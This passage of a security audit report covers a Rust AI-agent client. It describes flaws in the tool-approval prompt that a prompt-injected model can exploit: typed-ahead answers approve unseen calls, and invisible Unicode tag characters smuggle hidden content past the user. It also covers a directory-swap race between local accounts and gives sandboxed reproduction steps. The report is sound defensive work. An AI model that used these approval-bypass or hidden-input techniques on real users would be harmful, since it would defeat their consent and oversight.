logged.

### Owner-observed check

None. The record has no deployment plan, and the local plan above can answer all of its blockers.

---

<a id="lead-5"></a>
## Lead 5: The agent tool-confirmation prompt takes terminal type-ahead as its answer, so a line typed before the prompt appeared can approve a local MCP or server tool call

- **Fingerprint:** `rust/src/agent.rs:ask_tty:confirmation-consumes-type-ahead`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-03)
- **Affected boundary:** Model to local action (approval binding). A line typed before the prompt appeared is accepted as consent for the call that is shown afterwards.

### Description (verified record text)

Attacker: content that steers the model or agent, such as a prompt-injected web page, file or MCP result. It controls the session events the CLI prints and folds. Affected principal: the local user who runs `ask-claude agent` on a terminal (chat, or a one-shot whose stdin is a tty) with the default ASK_CLAUDE_CONFIRM=ask policy. Execution identity: the user's own account. For a custom call, the action runs as the user's --local-mcp server's tools/call. For an ask, it is a user.tool_confirmation 'allow' sent for a server tool. During a turn, Streamed::take prints every model event live as it arrives. That includes agent.message text such as 'reply yes to continue', and the '(name) ' marker of a tool call. Nothing reads the terminal during the turn. In chat, reedline's read_line has returned and crossterm restored the saved cooked termios with TCSANOW, which does not discard input. So a line the user types and ends with Enter waits in the tty's canonical input queue. When the stream then ends on requires_action, Agent::answer passes ask_tty to session::answer, and Gate::confirm calls it. ask_tty opens /dev/tty, prints 'allow <name> <input>? [y/N/a(lways)] ' and returns the first queued line. It never discards earlier input (no tcflush/TCIFLUSH anywhere in rust/src, and none in reedline 0.53.0 or crossterm 0.29.0). An exact 'y'/'Y'/'yes' therefore approves a specific tool call and input the user had not seen when they typed. 'a'/'A'/'always' also grants that name for the rest of the process. The model can bait the reply with its printed text. It can also widen the window: it streams the text, then runs always-allowed server-side work before the session goes idle with requires_action. Source does not settle the decisive part: that the built binary, on a real pty, consumes the queued line as the answer. The shared pattern in the bash oracle (lib/agent-turn.bash:86, `read -r -p ... </dev/tty` with no flush) is calibration, not a dismissal. Approval binding to the shown object is otherwise sound (session.rs 452-466, 484-497). No tty means a fail-closed denial (session.rs 369-374). Preconditions: the user types a matching answer plus Enter before the prompt appears, which is user interaction plus a timing window. The echoed keys and the late prompt are visible on screen, but the call has already run by then. Candidate rust/src/agent.rs:ask_tty:buffered-typeahead-answers-confirmation has the same root cause and is merged into this record.

### Claimed root cause

ask_tty (rust/src/agent.rs:900-927) opens /dev/tty (902), prints the prompt (903) and reads up to the first newline (909-915) without first discarding pending terminal input, for example with tcflush(fd, TCIFLUSH). Gate::confirm (rust/src/session.rs:379-386) treats whatever exact 'y'/'Y'/'yes'/'a'/'A'/'always' line it returns as fresh consent for the call now shown. The approval is not bound to a keystroke made after that specific pending action was displayed.

### Source trace

1. **entrypoint**: `rust/src/agent.rs:1055` (`Streamed::take`). Untrusted session events (model-controlled agent.message text and agent.custom_tool_use/agent.tool_use) are printed live to stdout as they arrive via session::line, and kept for the fold (1057). The model's bait text and timing reach the user here, while nothing reads the terminal.
2. **propagation**: `rust/src/chat.rs:78` (`Input::read`). In terminal chat, reedline reads keys only inside read_line. On return, crossterm 0.29.0 restores the saved termios with TCSANOW (no input flush; reedline engine.rs 1292/1304). During a turn (agent.rs:642) the tty is in canonical mode and lines the user types are queued. In a one-shot run on a tty, no editor runs at all.
3. **propagation**: `rust/src/agent.rs:810` (`Agent::turn`). Once the stream ends with stop_reason requires_action and the fold has asks or custom calls, self.answer(&fold) is called.
4. **propagation**: `rust/src/agent.rs:861` (`Agent::answer`). tty is stdin.is_terminal() and /dev/tty openable. ask_tty is passed to session::answer as the gate's ask callback.
5. **propagation**: `rust/src/session.rs:495` (`session::answer`). Each custom call whose name the local MCP server lists goes through gate.confirm. At line 457, each server-tool ask goes through the same gate before a user.tool_confirmation is built.
6. **propagation**: `rust/src/session.rs:379` (`Gate::confirm`). Calls ask with the prompt and allows on an exact 'y'/'Y'/'yes' (381), or records a process-wide always grant on 'a'/'A'/'always' (382-385).
7. **propagation**: `rust/src/agent.rs:909` (`ask_tty`). After opening /dev/tty (902) and printing the prompt (903), a worker thread reads one byte at a time up to the first newline. A line already in the canonical input queue is returned at once. No tcflush or drain comes first.
8. **sink**: `rust/src/session.rs:497` (`session::answer`). On that pre-typed approval, server.call(&tool_use) sends tools/call for the model-chosen name and input to the user's local MCP server (local_mcp.rs 300-315). For an ask, a user.tool_confirmation with result 'allow' is pushed instead (session.rs 461-464).

### Verified evidence

- `rust/src/agent.rs:902`: ask_tty: File::open("/dev/tty"), then eprint!(prompt) at 903, then byte reads at 909-915. No termios or tcflush call between the open and the read. A grep of rust/src and rust/tests finds no tcflush, TCIFLUSH, tcdrain or termios.
- `rust/src/session.rs:381`: "y" | "Y" | "yes" => true. Line 382 "a" | "A" | "always" also inserts the shown name into the in-memory always set.
- `rust/src/agent.rs:1055`: Model events, including agent.message text, are printed live during the turn. The confirmation prompt comes only after the stream ends (Streamed::read 1012-1020, fold at 780, requires_action at 787).
- `rust/src/chat.rs:78`: The terminal editor reads only between turns. Locked reedline 0.53.0 read_line calls enable_raw_mode/disable_raw_mode around each read (engine.rs 1292, 1304). crossterm 0.29.0 restores the termios with TCSANOW / OptionalActions::Now (terminal/sys/unix.rs 179, 316), which keeps pending input. Neither crate calls tcflush.
- `rust/src/agent.rs:861`: User presence is taken as 'stdin is a terminal and /dev/tty opens'. Nothing checks that the answer was typed after the prompt was shown.
- `lib/agent-turn.bash:86`: The bash oracle reads the answer with `IFS= read -r -p ... answer </dev/tty`, also without a flush. This shared pattern is calibration only.

### Exact blockers

- No OS-enforced sandbox is available in this run (no network-less, empty-environment, read-only-target, scratch-only, resource-limited execution), so rust/ was not built and the binary was not driven on a pty. So no one observed a line queued before the prompt being returned by ask_tty and producing 'ask-claude: allowed local <name>'. That observation is the decisive fact. No trusted pty harness was available either: python3 is absent, and no artifact could be promoted.
- Timing in a live session is not visible in source: whether a real Managed Agents session lets the model print bait text and then stay busy (always-allowed server-side work) long enough before status_idle requires_action for a user to type ahead. A local replay fixture can stand in for the mechanism, not for real-world likelihood.

### Bounded local resolution plan

Do this inside an approved OS-enforced sandbox: no network, an empty allowlisted environment, read-only target and toolchain, writes only to scratch, low CPU, memory and wall-clock limits. Build rust/ offline from the committed Cargo.lock with the vendored registry. Create a scratch replay directory for ASK_CLAUDE_REPLAY in the shape of rust/tests/terminal.rs asking(). 1.sse holds ': connected', a data: agent.message ('reply yes to continue'), a data: agent.custom_tool_use {"id":"sevt_P1","name":"probe","input":{}}, a session.usage, and then session.status_idle with stop_reason requires_action and event_ids ["sevt_P1"]. 2.sse ends with end_turn. Set --local-mcp to a scratch stdio MCP stub that answers initialize, lists exactly one tool named 'probe', and on tools/call appends one line to scratch/marker. Environment: ANTHROPIC_API_KEY=dummy, ASK_CLAUDE_AGENT=agent_FIXTURE, ASK_CLAUDE_ENVIRONMENT=env_FIXTURE, ASK_CLAUDE_REPLAY=<scratch replay>, HOME and XDG_STATE_HOME under scratch, ASK_CLAUDE_CONFIRM unset. Open a pty pair. In canonical mode, write 'y\r' to the master before spawning `ask-claude agent go` with stdin, stdout and stderr on the slave as its controlling terminal (setsid plus TIOCSCTTY). The one-shot avoids reedline. Send nothing else, then wait up to 5 s. Vulnerable result: stderr shows 'allow local probe {}? [y/N/a(lways)] ' followed at once by 'ask-claude: allowed local probe ({})', and scratch/marker has exactly one line. Chat variant: start `ask-claude agent` with the same fixture. Type 'go\r' at the '> ' prompt, then 'yes\r' at once, before 'allow' appears (a replay reader delay, if the harness has one, makes this timing deterministic). Same expected result. Fixed result: add `libc::tcflush(tty.as_raw_fd(), libc::TCIFLUSH)` (ignoring ENOTTY) in ask_tty after the open and before the eprint. The prompt then waits. Closing the master gives EOF, which is a denial: 'Tool call denied by the user', and no marker line. Keep this as a regression test in rust/tests/terminal.rs next to terminal_agent_always_answers_the_rest_of_the_run. Stop once the marker line is observed. Do not use a real tool or a real key.

### Owner-observed check

Owner-observed check only, non-destructive. On a real terminal, against a test agent and environment with a dummy --local-mcp tool that only writes a marker file, have the agent print a question and then do a few seconds of always-allowed server-side work before calling the dummy tool. Type 'yes' and Enter while that work runs. Record whether the confirmation is answered without a key pressed after the prompt. This measures real-world timing. It is not needed to establish the source defect.

---

<a id="lead-6"></a>
## Lead 6: In agent chat Pipe mode, a stdin worker thread keeps reading the terminal during turns and competes with ask_tty for the confirmation answer

- **Fingerprint:** `rust/src/chat.rs:Input::new:pipe-worker-reads-tty-during-confirmation`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-07)
- **Affected boundary:** Model to local action (approval intent). In agent chat Pipe mode, two readers wait on one terminal, so a typed answer can be lost, misrouted, or assembled from fragments of different lines.

### Description (verified record text)

Agent chat (`ask-claude agent` or `agent resume` with no prompt) uses Input::Pipe when stdin is a terminal but neither stdout nor stderr is one, for example `ask-claude agent 2>&1 | tee session.log`, where the prompt still reaches the user's screen through tee (chat.rs:45-48). Pipe mode starts transport::lines(stdin) on a worker thread that loops on BufReader::read_until over fd 0. The channel is unbounded, so the worker does not stop at one line: it goes straight back into read(2) on the terminal and stays there for the whole of every turn (transport.rs:320-334). Agent::chat builds this Input once and keeps it across turns (agent.rs:618). When a session event asks for a confirmation, Agent::turn calls Agent::answer (agent.rs:810). The tty check there looks only at stdin and /dev/tty (agent.rs:861), so ask_tty opens /dev/tty, the same terminal, and reads it one byte per read(2) on a second thread (agent.rs:900-916). Nothing stops the worker, takes the terminal for ask_tty alone, or drains pending input, so two readers wait on one canonical-mode line queue. Linux n_tty_read holds the tty's atomic_read_lock while it waits for input. If that holds on the target kernel, the worker has been blocked since before ask_tty began, so it would get the first line typed as the answer. The gate would keep waiting. The typed 'y', 'a' or Enter would be queued and, after the turn, sent to the session as a user.message the user never meant as chat (agent.rs:620-642). Once the lock changes hands, ask_tty's 1-byte reads can take the first byte of a line and leave the rest to the worker. The string Gate::confirm matches can then be built from bytes of different typed lines. For example, the leading 'a' of a chat line plus a later bare Enter gives 'a', which allows the call and records a process-lifetime 'always' for that tool name (session.rs:379-383). Comparable baselines do not share the defect. The bash oracle runs no stdin reader during a turn, and reedline Terminal mode reads only inside read_line. That makes this a Rust-only Pipe-mode divergence. The only party who can trigger it is the local user's own typing, and timing decides the outcome. The model cannot pick which bytes end up where. What is lost is approval intent: answers can be lost or misrouted, and in the fragment case the user can grant an allow or always they did not type as an answer.

### Claimed root cause

Input::new starts transport::lines(stdin) on a free-running worker thread even when stdin is a terminal (rust/src/chat.rs:45-48, rust/src/transport.rs:320-334). That worker stays blocked in read(2) on the terminal for every turn. Agent::answer and ask_tty then read the same terminal through /dev/tty (rust/src/agent.rs:861, 902-909). Nothing pauses the worker, gives ask_tty exclusive ownership of the terminal, or drains pending input before asking. Gate::confirm accepts whatever bytes ask_tty collected up to a newline (rust/src/session.rs:379-383).

### Source trace

1. **entrypoint**: `rust/src/chat.rs:45` (`Input::new`). The local user runs agent chat with stdin on a terminal and both stdout and stderr redirected (e.g. `2>&1 | tee log`). The test `!stdin || !(stdout || stderr)` is true, so Pipe mode is chosen (line 48).
2. **propagation**: `rust/src/transport.rs:326` (`transport::lines worker`). The worker loops on BufReader::read_until(b'\n') over fd 0. It sends each line on an unbounded channel and goes straight back into read(2) on the terminal, including while a turn runs.
3. **propagation**: `rust/src/agent.rs:810` (`Agent::turn`). A requires_action fold is answered through Agent::answer while the worker is still blocked reading the terminal. tty is true from stdin.is_terminal() and /dev/tty opening (line 861).
4. **propagation**: `rust/src/agent.rs:909` (`ask_tty`). A second thread reads the same terminal through /dev/tty, one byte per read(2), until a newline. It collects whatever bytes it wins.
5. **propagation**: `rust/src/session.rs:379` (`Gate::confirm`). The bytes ask_tty collected are matched against y/Y/yes (allow) and a/A/always (allow, plus a per-name always for the rest of the process) at lines 381-383.
6. **sink**: `rust/src/agent.rs:642` (`Agent::chat`). After the turn, lines (or line remnants) the worker took during the confirmation are read from the channel and sent to the session as user.message events.

### Verified evidence

- `rust/src/chat.rs:48`: return Self::Pipe(transport::lines(Box::new(std::io::stdin()))); runs whenever stdin is a terminal but stdout and stderr are not.
- `rust/src/transport.rs:322`: The worker thread is spawned with no pause, handoff or stop mechanism. It reads until EOF, a read error or a failed send. The mpsc channel is unbounded, so it keeps reading while the main thread runs a turn.
- `rust/src/agent.rs:618`: Agent::chat builds Input::new() once and keeps it, worker running, across every turn.
- `rust/src/agent.rs:861`: The tty decision for the gate checks only stdin.is_terminal() and that /dev/tty opens. It does not check whether another reader is draining the terminal.
- `rust/src/agent.rs:909`: ask_tty reads /dev/tty one byte per read(2). Each read takes and releases the terminal separately, so another reader can take the rest of a canonical-mode line.
- `rust/src/session.rs:383`: An 'a' answer, even one assembled from fragments, approves the shown tool name for the rest of the process.

### Exact blockers

- The decisive fact is not visible in the target source: which of two blocked readers on one terminal gets a completed canonical-mode line, and whether the rest of a line can go to the other reader after ask_tty's 1-byte read. On Linux this depends on n_tty_read's atomic_read_lock, held across the input wait, and on mutex wake and handoff order. macOS uses a different tty layer. The kernel version and platform a user runs are not fixed by the repository.
- No OS-enforced sandbox is available in this run. The binary would have to be built (cargo runs the ring build script and proc macros) and run on a pty, and both count as executing target-controlled code. So misrouted answers and answers assembled from fragments could not be observed. No artifact was produced or promoted.

### Bounded local resolution plan

Inside an OS-enforced sandbox (no network, empty allowlisted environment, read-only target, scratch-only writes, low CPU and wall-clock limits), build the binary and drive agent chat (no prompt argument, ASK_CLAUDE_AGENT=agent_FIXTURE, ASK_CLAUDE_ENVIRONMENT=env_FIXTURE) through the util-linux `script` pty harness in rust/tests/terminal.rs. Change the script command line to `<bin> agent 2>&1 | cat` so stdin is the pty while stdout and stderr are pipes, which selects Input::Pipe. Use an ASK_CLAUDE_REPLAY fixture built like asking() in rust/tests/terminal.rs, with one requires_action bash confirmation in the first turn, then end_turn, and a dummy ANTHROPIC_API_KEY and ASK_CLAUDE_REQUEST_LOG in scratch. Test 1: type a first chat line, wait for 'allow bash {"command":"echo 1"}? [y/N/a(lways)] ' to appear through cat, type "y\r" once, wait 2 s, and record whether the request log has a user.tool_confirmation (and its result) or the process is still waiting. Then type "\r" to release the gate, and record whether a later user.message with text "y" is posted. Repeat 50 times. Test 2: after the prompt, type "a b\r", then "\r". In each of 50 runs, record whether user.tool_confirmation is 'allow' and whether a user.message with text ' b' (or 'a b') is posted. Stop each run at the first confirmation result and send Ctrl-C if it hangs. Regression for a fix (pause the worker or drain and lock the terminal during ask_tty, or refuse confirmations in Pipe-on-tty mode): every run should record exactly the typed answer, the gate should never hang, and no stray user.message should be posted.

### Owner-observed check

Owner-observed, manual and non-destructive, on each supported platform (a current Linux kernel and macOS) with a built release binary and a dummy agent whose only custom or server tool needs confirmation and has a harmless input: run `ask-claude agent 2>&1 | tee /tmp/askc.log` in a real terminal, send one chat line that makes the agent request the tool, type 'y' and Enter at the prompt, and note whether the call is allowed at once or the prompt keeps waiting. If it keeps waiting, press Enter and check the session history (/history) for a stray user message 'y'. Do not answer 'a' on a real tool.

---

<a id="lead-7"></a>
## Lead 7: Approval line leaves invisible format and tag code points in tool input unescaped

- **Fingerprint:** `rust/src/lib.rs:for_approval:invisible-format-codepoints-unescaped`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-11)
- **Affected boundary:** Model to local action (approval binding). Invisible code points let the visible approved input differ from the input that is executed.

### Description (verified record text)

The tool-confirmation prompt shows a model-chosen tool input as safe(for_approval(input)). for_approval escapes a fixed list of code points: C1, U+061C, U+200B-U+200F, U+202A-U+202E, U+2060-U+2064, U+2066-U+2069 and U+FEFF. serde_json's compact output (tojson) escapes only C0, quote and backslash, and safe drops only C0/DEL/C1 and the nine bidi controls. So every other Unicode Format (Cf) or default-ignorable code point reaches the terminal raw inside the prompt line. This includes the tag characters U+E0001 and U+E0020-U+E007F, which can encode ASCII invisibly, the variation selectors U+FE00-U+FE0F and U+E0100-U+E01EF, U+00AD, U+034F, the Hangul fillers U+115F, U+1160, U+3164 and U+FFA0, U+180B-U+180F, U+206A-U+206F, U+FFF9-U+FFFB, U+1D173-U+1D17A, and U+2028/U+2029. A prompt-injected agent can emit an agent.custom_tool_use, or an agent.tool_use that the policy asks about, whose string argument looks benign on the terminal but carries hidden content. On 'y' or 'a', LocalMcp::call sends the full input to the user's local MCP tool. For asks, the client answers allow and the server runs its own copy of the same input. That contradicts for_approval's stated rationale that hidden code points 'would show a value other than the one approved'. The attacker cannot hide or change the visible characters. The attacker can only add content that the user may not see. Impact depends on whether the terminal renders these code points with no glyph and whether the tool's consumer interprets them, for example an LLM that later reads tag-encoded text.

### Claimed root cause

for_approval (rust/src/lib.rs:752-766) escapes an enumerated list of code points instead of a property-based class (every General_Category=Cf and Default_Ignorable_Code_Point, plus U+2028/U+2029 and any other non-rendering code point). safe (rust/src/stream.rs:54-66) keeps all of them, so the visible approved string can differ from the executed value. The bash oracle FOR_APPROVAL (lib/common.bash:30) has the identical numeric set, so the goldens lock in the same gap. A fix must also emit supplementary-plane code points (tags, U+E01xx selectors, U+1D173-U+1D17A) as JSON surrogate-pair escapes (\udb40\udc41) to keep the output valid JSON and injective. The current \u{n:04x} format would print five hex digits for them.

### Source trace

1. **entrypoint**: `rust/src/session.rs:93` (`fold`). agent.custom_tool_use events from the untrusted session event stream (agent.tool_use at line 92 for asks) are collected with their raw name and input.
2. **propagation**: `rust/src/session.rs:447` (`answer, shown closure`). The input as the terminal shows it is safe(crate::for_approval(&e["input"])). The same closure is used for asks (line 452) and for custom calls after server.has(&name) passes (line 494).
3. **propagation**: `rust/src/lib.rs:755` (`for_approval`). Each char of tojson(v) is escaped only if it is in 0x80..=0x9f, 0x61c, 0x200b..=0x200f, 0x202a..=0x202e, 0x2060..=0x2064, 0x2066..=0x2069 or 0xfeff. Tag characters, variation selectors, U+00AD, U+034F, the fillers, U+180B-U+180F, U+206A-U+206F, U+FFF9-U+FFFB, U+1D173-U+1D17A and U+2028/U+2029 are pushed raw.
4. **propagation**: `rust/src/stream.rs:54` (`safe`). safe keeps tab and newline and drops only other C0, DEL, C1, U+202A-U+202E and U+2066-U+2069, so the remaining invisible code points survive.
5. **propagation**: `rust/src/session.rs:379` (`Gate::confirm`). Under Policy::Ask on a tty, and unless the name is already in the in-memory always set, the prompt 'allow {name} {input}? [y/N/a(lways)] ' is built from the shown input and passed to ask. An answer of y or a approves it.
6. **propagation**: `rust/src/agent.rs:903` (`ask_tty`). ask_tty, which is wired in as the gate's ask at agent.rs:869, writes the prompt unmodified to stderr with eprint! for the terminal to render.
7. **sink**: `rust/src/session.rs:497` (`answer`). On approval, server.call(&tool_use) sends the original tool_use input to the local MCP tool as tools/call arguments (local_mcp.rs:307-310), with the hidden code points included. For asks, the user.tool_confirmation allow event (session.rs:463-466) lets the server execute its copy of the same input.

### Verified evidence

- `rust/src/lib.rs:750`: Doc comment rationale: the escaped code points are those that, 'Dropped or hidden, they would show a value other than the one approved'. The enumerated list in lines 747-749 is narrower than that rationale.
- `rust/src/lib.rs:756`: The match arms cover only 0x80..=0x9f, 0x61c, 0x200b..=0x200f, 0x202a..=0x202e, 0x2060..=0x2064, 0x2066..=0x2069 and 0xfeff. No arm covers U+00AD, U+034F, U+115F, U+1160, U+180B-U+180F, U+206A-U+206F, U+3164, U+FE00-U+FE0F, U+FFA0, U+FFF9-U+FFFB, U+1D173-U+1D17A, U+E0000-U+E0FFF or U+2028/U+2029.
- `rust/src/lib.rs:700`: tojson is serde_json's to_string with DEL replaced by \u007f. serde_json escapes only C0, quote and backslash and writes all other non-ASCII code points raw.
- `rust/src/stream.rs:54`: safe keeps every code point except C0 (other than tab/newline), DEL, C1 and the nine bidi controls.
- `rust/src/lib.rs:786`: The only unit test covers the enumerated set and checks that U+00A0 is left as is. No test covers tag characters, variation selectors or other Cf code points. A grep of rust/tests finds none either.
- `rust/src/local_mcp.rs:307`: LocalMcp::call sends tool_use["input"] unchanged, or {} when the input is null or false, as the tools/call arguments.
- `lib/common.bash:30`: The bash oracle FOR_APPROVAL escapes the identical numeric set (128-159, 1564, 8203-8207, 8234-8238, 8288-8292, 8294-8297, 65279). This is a shared defect pattern that the goldens lock in. It does not excuse the Rust gap.

### Exact blockers

- Terminal rendering is decisive and not visible in source: it is unknown whether common terminals render tag characters, variation selectors, U+00AD, the Hangul fillers, U+180B-U+180F, U+206A-U+206F, U+FFF9-U+FFFB, U+1D173-U+1D17A and U+2028/U+2029 inside the stderr prompt line with no visible glyph and zero width, or as replacement boxes or hex glyphs. Examples to test are xterm, VTE/GNOME Terminal, iTerm2, kitty, Windows Terminal and tmux.
- No OS-enforced sandbox is available in this run, so no target code was executed: neither cargo test nor a for_approval/safe harness that would show the prompt bytes. The promotion allowlist is empty, so no runtime artifact exists.
- Impact depends on the user's configured --local-mcp tool, or on a built-in tool the policy asks about, whose consumer interprets the hidden code points. An example is stored text later read by an LLM that decodes tag characters. That is a property of the user's deployment, not of this repository.

### Bounded local resolution plan

Inside an OS-enforced sandbox (no network, empty environment, read-only target, scratch-only writes, low CPU/memory/time limits), add a scratch-only unit test next to for_approval_escapes_what_the_script_escapes. It calls crate::stream::safe(&for_approval(&serde_json::json!({"text":"ok\u{e0049}\u{e0067}\u{e006e}\u{fe0f}\u{ad}\u{3164}\u{206a}\u{2028}done"}))) and asserts that each listed code point appears raw (as UTF-8, not as a \u escape) in the output. Have the parent promote the formatted prompt bytes 'allow local write <output>? [y/N/a(lways)] ' as one predeclared regular file. Then, outside the target, display that file in xterm, VTE, iTerm2, kitty, Windows Terminal and tmux and record which code points render with no visible glyph. Finally, in the sandbox, run a session replay against a dummy --local-mcp echo server, answer 'y', and confirm that the tools/call arguments the echo server logs contain the hidden code points. Stop at that observation.

### Owner-observed check

Owner-observed: list the --local-mcp tools users approve, and any always_ask built-in tools, whose string arguments are stored, sent or later read by an LLM (notes, file writes, messages). Using a dummy note, check whether text approved as 'ok' with tag-encoded content is later decoded by that consumer as hidden instructions or data.

---

<a id="lead-8"></a>
## Lead 8: State-directory gate checks only the leaf; later by-name opens follow a directory another account can swap through a writable ancestor

- **Fingerprint:** `rust/src/history.rs:private_state:ancestor-unchecked-by-name-opens`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-09)
- **Affected boundary:** Other local accounts to the user's state directory. The gate checks only the leaf, and later opens go by name through an ancestor another account may be able to write.

### Description (verified record text)

history::state_dir (called once per process at lib.rs:74) vouches for <XDG_STATE_HOME or $HOME/.local/state>/ask-claude through private_state, which checks the leaf alone: create_dir_all, a symlink_metadata refusal, an O_DIRECTORY|O_NOFOLLOW open, fchmod 0700, and an fstat owner/mode verdict on that descriptor. The descriptor is then dropped and only the path is returned. Every later access reopens by path string: the skills container file read each round (lib.rs:455-458), chat listing and load for `list`/`resume` (history.rs:264-287, 336-349), session stub listing (session.rs:288-295), and the events.jsonl append (event.rs:394-403). If any ancestor is writable by another local account (no sticky bit, or owned by that account), that account can rename the checked directory away after the check and put its own directory in its place. Persistence differs by effect. In a running interactive chat (or any multi-round process) no race is needed. (a) With -s, an attacker-chosen id in <chat>.container is read on the next round and sent as container.id (request.rs:95). (d) Each round's event line (chat name or session id, host, model, usage, tools) is appended to an attacker-owned, world-readable events.jsonl, because the open does no owner/type/mode fstat; a FIFO planted there blocks the O_WRONLY open with no reader present. Effects that need a fresh process must win a short race, because a swapped-in directory owned by another account is refused at startup (verdict, history.rs:98). The swap has to land between the gate at lib.rs:74 and the by-name read that follows; the attacker can time it from an inotify watch on the writable parent, which sees the gate's fchmod as IN_ATTRIB. (b) Planted *.json chats are then listed, and with a future mtime one becomes the default for a bare `ask-claude resume`, so attacker-written turns are resent under the user's API key as the user's own history. (c) Planted sesn_* stubs redirect `agent resume/budget/archive/files <prefix>`. (e) In the PermissionDenied branch, set_permissions by name (history.rs:72) follows a symlink swapped in after the symlink_metadata check at line 59. That needs two swaps inside the gate itself (an attacker-owned mode-000 directory to provoke EACCES, then a symlink), and it can only chmod a target the user owns to 0700. Writes through history::replace stay create_new 0600 plus rename, so chat contents written into the swapped directory are not readable by the other account. The run-2 bash record has the same root cause, carried into Rust; the shared pattern strengthens rather than excuses the Rust finding.

### Claimed root cause

private_state (rust/src/history.rs:45-86) establishes ownership and privacy only for the final path component (fchmod at line 81, fstat verdict at 82-85). It does not check ancestors, and it does not keep the verified directory descriptor for later descriptor-relative opens. Callers then reopen files under the state directory by path (lib.rs:456, history.rs:265/276/286, session.rs:266-271/288-294, event.rs:403), so once an ancestor is writable by another account the check does not cover the object later used. The events.jsonl append also skips any fstat owner/regular-file check and has no O_NONBLOCK. The source comment at history.rs:39-43 acknowledges the ancestor gap.

### Source trace

1. **entrypoint**: `rust/src/history.rs:15` (`history::state_dir`). The state base comes from XDG_STATE_HOME or $HOME/.local/state. The lower-trust input is another local account's control of a directory entry on this path: it can write an ancestor (shared group or default-ACL tree, attacker-precreated path) and so rename entries under it.
2. **propagation**: `rust/src/history.rs:58` (`history::private_state`). create_dir_all creates missing ancestors (umask 077, though a parent's default ACL still applies), and no ancestor's owner or write bits are checked afterwards.
3. **propagation**: `rust/src/history.rs:85` (`history::private_state`). fchmod (line 81) and the fstat owner/mode verdict cover only the leaf descriptor, which is dropped on return. Only the path is returned, and lib.rs:74 runs this once per process.
4. **propagation**: `rust/src/lib.rs:446` (`lib::call`). The container file path is derived by name from the chat path under the state directory.
5. **propagation**: `rust/src/lib.rs:456` (`lib::call`). With -s, every round re-reads <chat>.container by path, through whatever directory is at that name by then. No owner or type check is made, and nothing is bound to the gate's descriptor.
6. **sink**: `rust/src/request.rs:95` (`request::body`). The file's contents become container.id in the user's authenticated Messages request.

### Verified evidence

- `rust/src/history.rs:39`: The doc comment states that later opens go by name and that an ancestor another account can write is not covered.
- `rust/src/history.rs:72`: In the EACCES branch, set_permissions(state, 0700) is a chmod by path. It follows a symlink swapped in after the symlink_metadata check at line 59, but only by racing two swaps inside the gate, and only onto a target the user owns.
- `rust/src/history.rs:98`: verdict refuses a leaf another account owns at startup. A persistent swap therefore affects only an already-running process, and a fresh `resume` or `agent` process must be raced between lib.rs:74 and its by-name read.
- `rust/src/history.rs:338`: A bare `resume` picks the newest-mtime *.json with turns from read_dir(state) (chats() at 264-282 uses std::fs::metadata and read, which follow links). A planted chat with a future mtime is selected and its turns are resent (lib.rs:86-106).
- `rust/src/session.rs:288`: session::find lists stubs from state/sessions by name. Planted id-shaped stubs resolve the user's prefixes to attacker-chosen session ids.
- `rust/src/event.rs:403`: events.jsonl is opened O_CREAT|O_APPEND|O_NOFOLLOW (line 401) with no fstat of owner, type or mode and no O_NONBLOCK. An existing attacker-owned 0666 file there is appended to, and a FIFO there blocks the open.
- `rust/src/main.rs:37`: umask 077 limits the ancestors the process creates itself. It does not cover pre-existing ancestors or default-ACL inheritance.
- `rust/src/lib.rs:74`: history::state_dir, and so the only gate, runs once per process. Later rounds of an interactive chat never re-check the directory.

### Exact blockers

- No OS-enforced sandbox is available in this run. No second local account, rename swap, inotify-timed race or ACL'd directory could be exercised, and the target binary was not built or run.
- Whether a realistic configuration puts an ancestor of the state directory under another account's write control is a deployment fact outside source. Examples are a shared group or default-ACL tree, a non-sticky shared directory, or an attacker-precreated XDG_STATE_HOME path.
- Whether the fresh-process effects (b, c) and the in-gate symlink chmod (e) are winnable races in practice is an OS timing fact that needs a two-account runtime test.
- Whether the API accepts a container id or session id from another workspace under the user's key decides the impact of (a) and (c). It is provider behaviour that cannot be observed locally.

### Bounded local resolution plan

Use a disposable VM with no network and two dummy accounts A and B. Create /srv/shared owned by B, mode 0777, without the sticky bit. Run as A with an empty environment plus HOME, XDG_STATE_HOME=/srv/shared, ASK_CLAUDE_REPLAY=<A-private fixture dir whose 1.sse and 2.sse replies carry container.id cntr_A>, ASK_CLAUDE_REQUEST_LOG=<A-private 0600 file> and a dummy ANTHROPIC_API_KEY. (1) No race needed: as A, start an interactive `ask-claude -s <dummy-skill>` chat and send one line. As B, run `mv /srv/shared/ask-claude /srv/shared/old`, then create a B-owned 0777 /srv/shared/ask-claude holding <same chat name>.json.container with content cntr_B and a B-owned 0666 events.jsonl. As A, send a second line. Expected if vulnerable: the second body in the request log has "container":{"skills":...,"id":"cntr_B"}, and B can read A's appended event line in events.jsonl. Optionally repeat with mkfifo events.jsonl and observe that A's second round blocks. (2) Race, for a fresh process: restore A's real directory. As B, pre-stage /srv/shared/evil (B-owned, holding x.json with one user turn "PLANTED" and `touch -d '+1 day'`), and run `inotifywait -m -e attrib /srv/shared` that renames ask-claude away and evil into place on the first event. As A, run a bare `ask-claude resume` up to 50 times. Expected if vulnerable: at least one run prints `resuming /srv/shared/ask-claude/x.json` and the request log carries PLANTED, while the other runs fail the gate with 'owned by uid <B>'. Stop at those observations, and delete both accounts' fixtures afterwards.

### Owner-observed check

The owner confirms whether supported setups ever put XDG_STATE_HOME or $HOME/.local/state under a directory another account can write (shared group directories, default ACLs, network home directories, a precreated /tmp path). The owner also confirms whether the Messages and Managed Agents APIs accept a container id or session id from another workspace or organization under the user's key.

---

<a id="lead-9"></a>
## Lead 9: --mcp-tool entries separated by tab or newline pass config::check but leave an --mcp server with every tool enabled

- **Fingerprint:** `rust/src/config.rs:words:mcp-tool-ifs-split-vs-request-space-split`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-08)
- **Affected boundary:** The user's per-server tool restriction (--mcp-tool) to the request. The validated entries differ from the applied allowlist, and a server that no applied word matches keeps every tool.

### Description (verified record text)

